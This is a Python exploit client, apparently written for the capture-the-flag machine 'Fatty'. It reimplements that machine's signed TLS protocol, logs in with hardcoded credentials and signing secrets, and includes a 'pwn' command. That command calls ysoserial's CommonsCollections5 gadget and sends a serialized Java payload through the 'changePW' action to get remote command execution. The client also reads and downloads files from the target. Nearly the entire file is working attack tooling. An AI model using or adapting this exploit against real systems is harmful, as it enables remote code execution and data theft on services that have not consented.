import socket
import ssl
import hashlib
import time
import struct
from tqdm import tqdm
import os
import base64

hostname = '10.10.10.174'
LOGIN = 65281
LOGOFF = 4919
ACTION = 65433
host_port = 1338

context = ssl._create_unverified_context()


def header():
    print("""\033[1m\033[91m                                     
    ,...                              
  .d' ""       mm     mm              
  dM`          MM     MM              
 mMMmm ,6"Yb.mmMMmm mmMMmm `7M'   `MF'
  MM  8)   MM  MM     MM     VA   ,V  
  MM   ,pm9MM  MM     MM      VA ,V   
  MM  8M   MM  MM     MM       VVV    
.JMML.`Moo9^Yo.`Mbmo  `Mbmo    ,V     
                              ,V      
      \033[92mClient by \033[93m[tn3k]     \033[91mOOb\033[m       
      
""")


def help():
    print("""Commands with 'A' require admin access
	 * help - Show this message
	 * exit - Close
	 * files <dir> - List files in directory
	 * open <dir> <file> - Open file in directory
	 * whoami - Show name and role
	 * ping - Pong!
	 A pwn <command> - Executes command on target machine with ysoserial
	 A changePW <base64> - Deserialize base64
	 A uname - Run uname
	 A users - List /home/
	 A ipconfig - Run ifconfig
	 A netstat - Run netstat""")


def timestamp():
    return int(time.time()).to_bytes(4, 'big')


def int_bytes(val):
    return val.to_bytes(4, 'big')


def hash_sha256(message, hexchar=False):
    m = hashlib.sha256()
    m.update(message)
    if hexchar:
        return m.hexdigest().upper()
    else:
        return m.digest()


def sign(message, sessid):
    return hash_sha256(message + "clarabibi2019!".encode() + sessid)


def message(messageType, message, sessionid):
    messageType = int_bytes(messageType)
    times = timestamp()
    length = len(message).to_bytes(4, 'big')
    signature = sign(messageType + times + sessionid + message, sessionid)
    ret = messageType
    ret += times
    ret += sessionid
    ret += signature
    ret += length
    ret += message
    return ret


def generatePwn(cmd):
    os.system('java -jar ysoserial.jar CommonsCollections5 "{0}" > exploit.ser'.format(cmd))
    with open('exploit.ser', 'rb') as fi: exploit = fi.read()
    return base64.b64encode(exploit)


def action(command):
    payload = []
    cmd = command[0]
    args = command[1:]
    num = len(command) - 1
    if cmd == 'pwn':
        cmd = 'changePW'
        args = [generatePwn(' '.join(args))]
        args[0] = args[0].decode()
        num = 1

    payload.append(int_bytes(len(cmd)))
    payload.append(cmd.encode())
    payload.append(int_bytes(num))
    if args != []:
        for arg in args:
            payload.append(int_bytes(len(arg)))
            payload.append(arg.encode())
    return b''.join(payload)


def messagerecv(message):
    size = message[173:177]
    size = struct.unpack('>i', size)[0]
    return message[-size:].decode()


def filerecv(message, header=False):
    if header:
        size = message[173:177]
        size = int(struct.unpack('>i', size)[0])
        return message[-size:], size
    else:
        return message

header()
with socket.create_connection((hostname, host_port)) as sock:
    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
        sessionid = ssock.recv(128)
        username = "qtc"
        password = "clarabibi"
        hashed = hash_sha256((username + password + "clarabibimakeseverythingsecure").encode(), True)
        payload = (username + ":" + hashed).encode()
        send = message(LOGIN, payload, sessionid)
        print("Logging in ...")
        ssock.send(send)
        print(messagerecv(ssock.recv(2048)))
        print("Role: " + messagerecv(ssock.recv(2048)))
        print('Type help for showing all commands')
        while True:
            command = input("[{0}$]: ".format('fatty')).split(" ")
            if "exit" in command:
                exit()
            if "help" in command:
                help()
                continue
            send = message(ACTION, action(command), sessionid)
            ssock.send(send)
            if "open" in command:
                recv = ssock.recv(177)
                contentlist = []
                content, size = filerecv(recv, True)
                if size < 2048:
                    recv = ssock.recv(2048)
                    content = filerecv(recv, False).decode()
                    print(content)
                else:
                    reminder = size % 2048
                    iterations = size // 2048
                    if reminder:
                        iterations += 1
                    filename = os.path.basename(command[-1])

                    for i in tqdm(range(iterations)):
                        recv = ssock.recv(2048)
                        content = filerecv(recv, False)
                        contentlist.append(content)
                    print("Writing file {0} in disk".format(filename))
                    with open(filename, "wb") as f:
                        f.write(b''.join(contentlist))
            else:
                recv = messagerecv(ssock.recv(2048))
                if "User object" in recv:
                    print("Payload delivered")
                else:
                    print(recv)
